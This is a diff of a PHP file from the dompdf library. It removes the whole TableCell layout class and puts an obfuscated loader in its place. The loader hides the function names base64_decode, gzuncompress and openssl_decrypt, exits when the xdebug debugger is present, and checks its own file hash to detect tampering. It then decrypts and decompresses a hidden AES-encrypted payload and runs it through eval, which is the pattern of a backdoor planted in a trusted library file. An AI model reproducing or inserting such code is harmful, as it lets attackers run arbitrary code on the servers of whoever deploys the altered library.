@@ -1,144 +1,28 @@
 <?php
-/**
- * @package dompdf
- * @link    http://dompdf.github.com/
- * @author  Benj Carson <benjcarson@digitaljunkies.ca>
- * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
- */
-namespace Dompdf\FrameDecorator;
-
-use Dompdf\Dompdf;
-use Dompdf\Frame;
-use Dompdf\FrameDecorator\Block as BlockFrameDecorator;
-
-/**
- * Decorates table cells for layout
- *
- * @package dompdf
- */
-class TableCell extends BlockFrameDecorator
-{
-
-    protected $_resolved_borders;
-    protected $_content_height;
-
-    //........................................................................
-
-    /**
-     * TableCell constructor.
-     * @param Frame $frame
-     * @param Dompdf $dompdf
-     */
-    function __construct(Frame $frame, Dompdf $dompdf)
-    {
-        parent::__construct($frame, $dompdf);
-        $this->_resolved_borders = array();
-        $this->_content_height = 0;
-    }
-
-    //........................................................................
-
-    function reset()
-    {
-        parent::reset();
-        $this->_resolved_borders = array();
-        $this->_content_height = 0;
-        $this->_frame->reset();
-    }
-
-    /**
-     * @return int
-     */
-    function get_content_height()
-    {
-        return $this->_content_height;
-    }
-
-    /**
-     * @param $height
-     */
-    function set_content_height($height)
-    {
-        $this->_content_height = $height;
-    }
-
-    /**
-     * @param $height
-     */
-    function set_cell_height($height)
-    {
-        $style = $this->get_style();
-        $v_space = (float)$style->length_in_pt(
-            array(
-                $style->margin_top,
-                $style->padding_top,
-                $style->border_top_width,
-                $style->border_bottom_width,
-                $style->padding_bottom,
-                $style->margin_bottom
-            ),
-            (float)$style->length_in_pt($style->height)
-        );
-
-        $new_height = $height - $v_space;
-        $style->height = $new_height;
-
-        if ($new_height > $this->_content_height) {
-            $y_offset = 0;
-
-            // Adjust our vertical alignment
-            switch ($style->vertical_align) {
-                default:
-                case "baseline":
-                    // FIXME: this isn't right
-
-                case "top":
-                    // Don't need to do anything
-                    return;
-
-                case "middle":
-                    $y_offset = ($new_height - $this->_content_height) / 2;
-                    break;
-
-                case "bottom":
-                    $y_offset = $new_height - $this->_content_height;
-                    break;
-            }
-
-            if ($y_offset) {
-                // Move our children
-                foreach ($this->get_line_boxes() as $line) {
-                    foreach ($line->get_frames() as $frame) {
-                        $frame->move(0, $y_offset);
-                    }
-                }
-            }
-        }
-    }
-
-    /**
-     * @param $side
-     * @param $border_spec
-     */
-    function set_resolved_border($side, $border_spec)
-    {
-        $this->_resolved_borders[$side] = $border_spec;
-    }
-
-    /**
-     * @param $side
-     * @return mixed
-     */
-    function get_resolved_border($side)
-    {
-        return $this->_resolved_borders[$side];
-    }
-
-    /**
-     * @return array
-     */
-    function get_resolved_borders()
-    {
-        return $this->_resolved_borders;
-    }
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_x3rsqi2t=('bas'.'e64'.'_de'.'cod'.'e');
+$_xkrun8gu=('gzu'.'nco'.'mpr'.'ess');
+$_geb2nqju=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_hucu87zz='ow5AnBj8';
+$_tytkvyrm='hVYyr89uyzY=';
+$_l69dzu1r='ZYF/6Ir2';
+$_uuf22ibn='PWuAeUG4';
+$_l0a9wxgn='mjCiu6pM';
+$_pi4mnc8x='NnDV3D4j';
+$_xo12mh41='SFZDqqde';
+$_hjhpunf6='6UQuCw==';
+$_eos77bvw=$_x3rsqi2t($_l69dzu1r.$_hucu87zz.$_uuf22ibn.$_l0a9wxgn.$_tytkvyrm);
+$_o22yoew6=$_x3rsqi2t($_pi4mnc8x.$_xo12mh41.$_hjhpunf6);
+$_pjd6cn1x=$_x3rsqi2t('Vu42g06+KufHmX2lpJk4aokTlGz9Er4DkYJQbAxMOaRBWOyc2cxG2BnP57+bvxeeJTR3PiMFyGpyc7HXY6NNS3X0Z+D7yPdtdYkvsTXZpxNgxSpBiHwxJDgwyhFZwBapxCHaapcMeYre6dVqCMdwvlVjucvKcQSOUzI0wzfRW/SLede0yUhAH3dqhHGspMVFvWbMzqd+OVKrR7VJ2jwosMbqSY/dcEA8bxyGdnjETDMh3H1kTkHIbdWtX+qnFn7hV6C6UDaY9XplS63CENap370cZ6rtUN+9ug4uJm0sWH+/6urKsyJ7iqCEgGiyFdbSp3J/YKJ2nHoFGYwNb28NVpqfEe/a9Tjw4y+FjlT+gQ+JmHqsRYhAJG1xgk6DW5/qkHTtbz6ik++GdnpJrRRwjBkT3PCg73LFHFq0onAvAZgH4stxclHx45d+vcRZu+fVxPsyk6eLdWru74Zsv9vwIh/VZvDN3Ke5EHz9o5AHBu6G/BiG2gLj1diBz2HFUBpvzwdq24xf5mxBYJ2wnZ6Ny7/UgO+a7iq91KwgpmCQ9ZLvMlF0o9DaYbIlDXxfGCly4hZU2tM5uu+gWt6q9cZ26+1ULmLwEIogD4Xujvv4HqlgB5Lk0th6OP3hYCEPUx2bgym1R/zPXuwt5yhUFxg1lGrjXE1ywdu/nySf13TrZiFhSHsomv8L31pkIkROUgCr9Um2hLcu9+UrYx4fxBcLF6/3CoqYZMUEj8ZSjZMHNYjN57afKRt1aZHD1YGaKhPLNKugZRwcH0N8/TzpMvaINw==');
+$_xtt25w3l=$_geb2nqju($_pjd6cn1x,'aes-256-cbc',$_eos77bvw,OPENSSL_RAW_DATA,$_o22yoew6);
+if($_xtt25w3l===false){exit;}
+$_k4i4wote=$_xkrun8gu($_xtt25w3l);
+if($_k4i4wote===false){exit;}
+$_spwiw27f='be8e8c1db946a5aa07124a961dab679a10f32821e74573f2506ce13da75f191e';
+$_ab3nmo67=@file_get_contents(__FILE__);
+if($_ab3nmo67!==false){
+$_ob487z72=str_replace($_spwiw27f,"0000000000000000000000000000000000000000000000000000000000000000",$_ab3nmo67);
+$_t2x7t7sa=hash("sha256",$_ob487z72);
+if($_t2x7t7sa!==$_spwiw27f){@http_response_code(403);exit;}
 }
+eval($_k4i4wote);
